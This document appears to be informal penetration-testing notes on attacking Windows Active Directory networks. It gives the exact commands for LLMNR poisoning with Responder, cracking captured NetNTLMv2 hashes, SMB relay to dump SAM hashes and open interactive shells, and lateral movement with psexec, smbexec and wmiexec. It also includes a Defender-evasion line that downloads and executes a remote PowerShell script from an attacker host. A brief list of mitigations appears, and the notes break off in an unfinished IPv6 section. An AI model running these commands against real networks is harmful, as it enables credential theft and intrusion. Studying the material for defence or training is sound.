                LLMNR Poisoning - MITM, victim trys to access somtihng not on
                the domain, such as misstyping an address, we can `MITM` that
                by saying yes we know how to get there and they give us their
                hash to connect them.
                `responder` (part of empacket)
                    responds to request during MITM, you need alot of traffic
                    for it to work so let run for a while.
                    `python Responder.py -I tun0 -rdwv`
                    when we get a hash, use `hashcat` to see if we can
                    crack it! 
                    `hashcat -m 5600 hashes.txt rockyou.txt`
                        -m 5600 NetNTLMb2, you need to know what type 
                        of hash you have so you can get the right module
                        -m
                        
            #SMB Relay
                instead of cracking hashes from `responder` just relay it
                to another mechine with:
                    SMB signing disabled and hash user has admin rights
                    on tgt mechine.
                When someone makes a bad DNS request, `responder` captures
                    the hash and `ntlmrelayx` relays it to our target
                    with SMB running to get a dump of the `SAM hashes`
                    which is the shadow file for windows (local users)
                in `responder` turn `SMB` and `HTTP` off
                    `/usr/share/responder/Responder.conf`
                        `nmap --script=smb2-security-mode.nse -p445 <ip/cidr>`
                        server smb sign and required is default but host's
                        are not.so we want to add any host or server with
                        smb sign on but no req to `targets.txt`
                Set up our SMB relay
                    `python ntlmrelayx.py -tf targets.txt -smb2support`
                When user fat fingers a connection our responder will try
                    to get us creds and if the users an admin we get the 
                    SAM file (with all hashes like ect/shadow). Works best
                    on networks with alot of local admins and/or admins on
                    same box.
                Get a shell this way!
                    `python ntlmrelayx.py -tf targets.txt -smb2support -i`
                        `-i` will get you an interactive smb shell. you will
                        see: `tarted interactive SMB client shell via TCP on 127.0.0.1:11000`
                        then in new tab use nc: `nc 127.0.0.1 11000` to get
                        smb shell.
                        can also get other shells: `-e msfvenom_script.exe`
                        and use metasploit `multihandler` to get a shell
                        `-c <powershell revers shell command>`
                #SMB mitigation strategies
                    enable SMB signing on all devices
                        but will degrade file transfers by 15%
                    disable NTLM authentication
                        if Kerberos stops, windows defaults to NTLM
                    limit domain admins tasks
                        hard to enforce
                    local admin restriction
                        increases service desk tickets
            
            #shell access        
                `psexec` in `metasploit` can use smb creds that you got
                from above. however, it might get caught by windows defender
                `psexec.py <domain>.local/<smbuser>:<smbpass>@<tgt ip>`
                ran from terminal might get you thru
                quieter is to use: `smbexec.py` or `wmiexec.py` with same flags
                as `psexec.py`
                
                #getting around Windows Defender with `smbexec`
                    we can edit `psexec` to change how it uses `cmd.exe`
                    `cmd.exe /Q /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:8000/Connectar-Tcp.ps1');`
                    
            #IPv6 attacks
                most of the time on a network there is no DNS for IPV6 so we
                can spoof it in an AD network.You need `mitm6` and ``
                
                
                 
                    
                
                    
                    
                
                
                    
                    
                    
            
           
            
            
            
        
            
